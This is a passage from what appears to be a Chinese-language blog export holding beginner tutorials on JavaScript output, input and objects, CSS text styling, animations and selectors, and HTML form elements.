<h2 id="输出内容"><a href="#输出内容" class="headerlink" title="输出内容"></a>输出内容</h2><p>可以用alert()函数或者document.write()，这前者是弹出式，后者直接在网页中显示，还可以配合标签来使用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> title = <span class="string">"这是一级标题"</span>;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">"&lt;h1&gt;"</span>+title+<span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>还有用console.log()在控制台控制输出，一般用于程序员调试。</p>
<h2 id="输入内容"><a href="#输入内容" class="headerlink" title="输入内容"></a>输入内容</h2><p>获取用户输入，我们在HTML的表单中已经学习过，如果用JavaScript也可以实现，prompt()方法用于显示一个带有提示信息，并且用户可以输入的对话框。 </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">prompt(text,defaultText);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>可选。要在对话框中显示的提示信息（纯文本）</td>
</tr>
<tr>
<td>defaultText</td>
<td>可选。默认的输入文本。</td>
</tr>
</tbody></table>
<p>如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var inPut &#x3D; prompt(&quot;请输入你的内容&quot;,&quot;&quot;);</span><br><span class="line">	alert(&quot;您输出的是\n&quot;+inPut);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>JavaScript跟其他面向对象语言一样，有对象的属性，关于详细的面向对象，<a href="[https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/24792?fromtitle=%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B&fromid=254878](https://baike.baidu.com/item/面向对象程序设计/24792?fromtitle=面向对象编程&fromid=254878)">这里</a>有着详细的介绍</p>
<ul>
<li><p>使用对象字面量创建对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> student = &#123;</span><br><span class="line">    ID: <span class="number">11111111</span>,</span><br><span class="line">    name: <span class="string">"学生名字"</span>,</span><br><span class="line">    age: <span class="number">18</span>,</span><br><span class="line">    sayHello: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* 两种方法引用对象属性 */</span></span><br><span class="line">alert(student.ID);</span><br><span class="line">alert(student[<span class="string">"ID"</span>]);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>使用new object()方式创建</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> student = <span class="keyword">new</span> <span class="built_in">Object</span>(); <span class="comment">//创建了一个空对象</span></span><br><span class="line">student.ID = <span class="number">123</span>;</span><br><span class="line">student.name = <span class="string">"学生姓名"</span>;</span><br><span class="line">student.age = <span class="number">18</span>;</span><br><span class="line">student.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>利用构造函数方式创建</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Creatstudent</span>(<span class="params">s_ID,s_name,s_age</span>)</span>&#123; <span class="comment">//构造函数名一般首字母大写</span></span><br><span class="line">    <span class="keyword">this</span>.ID = s_ID;</span><br><span class="line">    <span class="keyword">this</span>.name = s_name;</span><br><span class="line">    <span class="keyword">this</span>.age = s_age;</span><br><span class="line">    <span class="keyword">this</span>.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有返回值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> student = <span class="keyword">new</span> Creatstudent(<span class="number">12345</span>,<span class="string">"学生姓名"</span>,<span class="number">18</span>);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="遍历对象的内容"><a href="#遍历对象的内容" class="headerlink" title="遍历对象的内容"></a>遍历对象的内容</h2><p>有的时候我们想获取对象的全部属性，我们可以用对象+“.”+属性名来获取，这种方法对于属性少的对象来说固然奏效，但是假如我的对象有一千个、一万个属性呢？（当然了这只是一个假设，我们自定义的对象一般不会有这么多的属性吧）上面的方法估计就有些吃力了吧！因此我们需要换一种方式来遍历。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> key;</span><br><span class="line"><span class="keyword">for</span>(key <span class="keyword">in</span> student)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key+<span class="string">":"</span>); <span class="comment">//循环一次 得到的是属性名</span></span><br><span class="line">    <span class="comment">// console.log(student.key); 不得使用该方法 因此该方法返回的是undefined</span></span><br><span class="line">    <span class="built_in">console</span>.log(student[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h2><ul>
<li><p>JavaScript中对象分为三种：自定义对象、内置对象、浏览器对象。</p>
</li>
<li><p>前面两种对象属于ECMAScript，第三个是JavaScript独有的</p>
</li>
<li><p>内置对象是官方定义，供开发人员使用的对象，它能帮助开发者快速开发，而不必要在意背后的工作原理（当然了喜欢钻研也可以）。</p>
</li>
<li><p>JavaScript提供了大量的内置对象，如Math、Date、Array、String等。</p>
</li>
<li><p>为了了解如何使用内置对象，我们需要去<a href="https://developer.mozilla.org/zh-CN/" target="_blank" rel="noopener">官网</a>查阅官方文档，例如，根据官方文档，我们可以知道获取时间的方法是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    nowtime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    year = nowtime.getFullYear();</span><br><span class="line">    month = nowtime.getMonth() + <span class="number">1</span>;</span><br><span class="line">    date = nowtime.getDate();</span><br><span class="line">    <span class="built_in">console</span>.log(year + <span class="string">"年"</span> + month + <span class="string">"月"</span> + date + <span class="string">"日"</span> + nowtime.toLocaleTimeString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 更新时间间隔</span></span><br><span class="line">setInterval(<span class="string">"showTime()"</span>, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>JavaScript基础</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 语法二</title>
    <url>/2020/03/08/CSS-%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="文本修饰类型CSS"><a href="#文本修饰类型CSS" class="headerlink" title="文本修饰类型CSS"></a>文本修饰类型CSS</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class_test</span> &#123;</span><br><span class="line">    <span class="comment">/* 对齐方式 */</span></span><br><span class="line">	<span class="attribute">text-align</span>: left;</span><br><span class="line">	<span class="comment">/* 行高 */</span></span><br><span class="line">	<span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">	<span class="comment">/* 字母间距 */</span></span><br><span class="line">	<span class="attribute">letter-spacing</span>: <span class="number">5px</span>;</span><br><span class="line">	<span class="comment">/* 单词间距 对中文无效*/</span></span><br><span class="line">	<span class="attribute">word-spacing</span>: <span class="number">30px</span>;</span><br><span class="line">	<span class="comment">/* 文本修饰 如加下划线等 */</span></span><br><span class="line">	<span class="attribute">text-decoration</span>: underline;</span><br><span class="line">	<span class="comment">/* 首行缩进 */</span></span><br><span class="line">	<span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br><span class="line">	<span class="comment">/* 文本大小写转换 capitalize是首字母自动大写 */</span></span><br><span class="line">	<span class="attribute">text-transform</span>: capitalize;</span><br><span class="line">	<span class="comment">/* 字体样式 */</span></span><br><span class="line">	<span class="attribute">font-family</span>: 微软雅黑;</span><br><span class="line">	<span class="comment">/* 字体大小 */</span></span><br><span class="line">	<span class="attribute">font-size</span>: <span class="number">5px</span>;</span><br><span class="line">	<span class="comment">/* 字体粗细 */</span></span><br><span class="line">	<span class="attribute">font-weight</span>: <span class="number">100px</span>;</span><br><span class="line">	<span class="comment">/* 字体阴影 */</span></span><br><span class="line">	<span class="comment">/* 按照顺序是水平方向的偏移，竖直方向的便宜，模糊程度（与值成正比）阴影颜色 */</span></span><br><span class="line">	<span class="attribute">text-shadow</span>: <span class="number">5px</span> <span class="number">100px</span> <span class="number">5px</span> blueviolet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="CSS动画"><a href="#CSS动画" class="headerlink" title="CSS动画"></a>CSS动画</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">color</span>: blueviolet;</span><br><span class="line">        <span class="attribute">background-color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 鼠标经过的时候 */</span></span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">color</span>: blueviolet;</span><br><span class="line">        <span class="attribute">background-color</span>: brown;</span><br><span class="line">        <span class="comment">/* 触发动画延迟时间 */</span></span><br><span class="line">        <span class="attribute">transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">        <span class="comment">/* 完成一次动画所需时间 */</span></span><br><span class="line">        <span class="attribute">transition-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* 虽然说上面的是一个通用的写法，但是以防万一还是尽可能多地覆盖各种内核 */</span></span><br><span class="line">        <span class="attribute">-webkit-transition-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* 选择要过渡的属性，默认是all */</span></span><br><span class="line">        <span class="attribute">transition-property</span>: height,background;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>如果想要更加复杂的动画，就要配合@keyframes来使用</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">        <span class="attribute">animation-name</span>: test_animation;</span><br><span class="line">        <span class="attribute">animation-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* 循环动画的次数 */</span></span><br><span class="line">        <span class="attribute">animation-iteration-count</span>: <span class="number">5</span>;</span><br><span class="line">        <span class="comment">/* 轮流反向播放动画 */</span></span><br><span class="line">        <span class="attribute">animation-direction</span>: alternate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@keyframes</span> test_animation &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* from相当于0% */</span></span><br><span class="line">        <span class="selector-tag">from</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 在这里输入0%到100%的有效值 */</span></span><br><span class="line">        50% &#123;</span><br><span class="line">            <span class="attribute">background-color</span>: blue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* to相当于100% */</span></span><br><span class="line">        <span class="selector-tag">to</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><ul>
<li>网页设计中常听的属性名：margin(外边距)、 border(边框)、 padding(内边距)、content(内容) ，CSS盒子模式都具备这些属性。</li>
<li>所有HTML元素可以看作盒子，在CSS中，”box model”这一术语是用来设计和布局时使用。 </li>
</ul>
<p>下面给出图解</p>
<img src="/2020/03/08/CSS-%E8%AF%AD%E6%B3%95%E4%BA%8C/box-model.png" class>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.class_test</span>&#123;</span><br><span class="line">        <span class="comment">/* 依次定义边框的粗细、样式、颜色 */</span></span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">        <span class="comment">/* 边框距离周围元素的上边距 */</span></span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="comment">/* 内容到边框的上边距 */</span></span><br><span class="line">        <span class="attribute">padding-top</span>: <span class="number">20px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>CSS基础</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 语法一</title>
    <url>/2020/03/08/css-%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 在网页设计中，往往会利用到HTML与CSS的结合，HTML是实现大致框架的，而CSS则是为HTML框架设置想要设定的样式属性，两者相结合可以完整的生成出相应的静态网页。 简单说， HTML进行布局，CSS进行页面的美化 ，即HTML指明有什么，CSS指明怎么放。</p>
<h2 id="创建CSS方法"><a href="#创建CSS方法" class="headerlink" title="创建CSS方法"></a>创建CSS方法</h2><ol>
<li><p>使用元素内嵌样式表</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>HTML原生超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span> <span class="attr">style</span>=<span class="string">"font-size: 40px;"</span>&gt;</span>CSS修饰超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span> <span class="attr">style</span>=<span class="string">"font-size: 40px; color: #ff0000;"</span>&gt;</span>有颜色的超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>
</li>
<li><p>使用文档内嵌样式表</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">a</span> &#123; <span class="comment">/* 所有的a标签都是这个样式 */</span></span></span><br><span class="line">            color: coral;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>css1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>文档内嵌CSS超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>​    <strong>注意上面head下面的style标签，它是内嵌到了文档中，它定义了所有a标签的样式</strong></p>
</li>
<li><p>使用外部样式表</p>
<ul>
<li><p>新建一个a.css文件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">37</span>, <span class="number">0</span>, <span class="number">139</span>);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在HTML文件中引入上文的a.css</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"a.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>css1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ol>
<p>   这三种样式是有优先级的，记住他们的优先级：元素内联式 &gt; 文档内嵌式 &gt; 外部式，但是文档内嵌式&gt;外部式有一个前提：文档内嵌式css样式的位置一定在外部式的后面。<br>   其实总结来说，就是–就近原则（离被设置元素越近优先级别越高）。<br>   但注意上面所总结的优先级是有一个前提：元素内联式 、文档内嵌式 、外部式是在的相同权值的情况下。</p>
<h2 id="CSS基本选择器"><a href="#CSS基本选择器" class="headerlink" title="CSS基本选择器"></a>CSS基本选择器</h2><ul>
<li><p>选择所有元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:*&#123;&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据类型选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:a&#123;&#125;</span><br><span class="line">body元素:&lt;a&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据类选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:.class_test&#123;&#125;</span><br><span class="line">body元素:&lt;a class &#x3D; &quot;class_test&quot;&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据ID选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:#id_test&#123;&#125;</span><br><span class="line">body元素:&lt;a id &#x3D; &quot;id_test&quot;&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据属性选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:[href]&#123;&#125;</span><br><span class="line">body元素:&lt;a href &#x3D; &quot;https:&#x2F;&#x2F;yalexin.gitee.io&#x2F;&quot;&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>:选择器动作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:a:hover&#123;&#125;</span><br><span class="line">body元素:&lt;a&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p><strong>说明:</strong>选择器仅出现在文档内嵌或者外部样式中。</p>
<p><strong>ID选择元素与类选择元素：</strong></p>
<ul>
<li>共同点：都可以作为选择器，改变属性外面的元素的样式。</li>
<li>不同点：ID选择器又叫做唯一选择器，ID是元素的一个唯一标识，即主键。即在网页中次ID属性值确保只出现一次，不能重复出现。类属性可以多次使用，用户根据需要，将部分具有某种特征的元素集合归为一类，可将该类元素表现出同一效果，比如说id=apple1的苹果、id=apple2的苹果，id=banana1的香蕉、id=banana2的香蕉，它们都同属于水果类，可以根据需要设置它们的class=fruit。</li>
</ul>
<h2 id="控制背景"><a href="#控制背景" class="headerlink" title="控制背景"></a>控制背景</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class_test</span> &#123;</span><br><span class="line">    <span class="attribute">background-attachment</span>:local;<span class="comment">/* 固定方式 */</span></span><br><span class="line">    <span class="attribute">background-size</span>: auto;</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;<span class="comment">/* 重复方式 */</span></span><br><span class="line">    <span class="attribute">background-color</span>: brown;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(hello.png);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>CSS基础</tag>
      </tags>
  </entry>
  <entry>
    <title>html语法二</title>
    <url>/2020/03/07/html%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><p>HTML5中，表单是HTML获得用户输入的手段。</p>
<ul>
<li><p>输入类型表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"请输入噢"</span>&gt;</span><span class="comment">&lt;!-- text是单行文本框value是占位符 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入噢"</span>&gt;</span><span class="comment">&lt;!--placeholder是提示内容--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入噢"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="comment">&lt;!--maxlength指明输入最大长度--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入噢"</span> <span class="attr">size</span>=<span class="string">"50"</span>&gt;</span><span class="comment">&lt;!--size指明输入框的长度--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"请输入噢"</span> <span class="attr">readonly</span>&gt;</span><span class="comment">&lt;!--readonly指明只读，不可编辑--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码噢"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">cols</span>=<span class="string">"10"</span>&gt;</span> <span class="comment">&lt;!-- 指定行数列数 --&gt;</span></span><br><span class="line">            这是内容</span><br><span class="line">            gh</span><br><span class="line">            h</span><br><span class="line">            j</span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a></li>
<li><p>按钮类型表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="comment">&lt;!-- value是提交表单时上传到服务器的内容 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"type='button'按钮"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"type='submit'按钮"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span><span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line">       这是一个复选框</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span>&gt;</span>单选1<span class="comment">&lt;!-- 三选一按钮集合 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span> <span class="attr">checked</span>&gt;</span>单选2 <span class="comment">&lt;!-- 默认选中 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span>&gt;</span>单选3</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>以上三种形式都可以实现按钮的功能，但是三者有着本质的区别，button比type=”button”的功能多，button可以当任何按钮来使用，适用范围更广泛。</li>
<li>type=”submit”用于提交表单，使用范围比type=”button”小一些</li>
<li>type=”button”一般用于配合js（JavaScript）使用</li>
<li>type=”submit”用于提交表单的时候，必须声明form里面的method属性，最好加上action属性</li>
</ul>
</li>
<li><p>其他类型表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> <span class="attr">min</span>=<span class="string">"-100"</span> <span class="attr">max</span>=<span class="string">"100"</span> <span class="attr">value</span>=<span class="string">"50"</span>&gt;</span><span class="comment">&lt;!-- 可滑动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    请选一个来进行选择</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择3<span class="tag">&lt;/<span 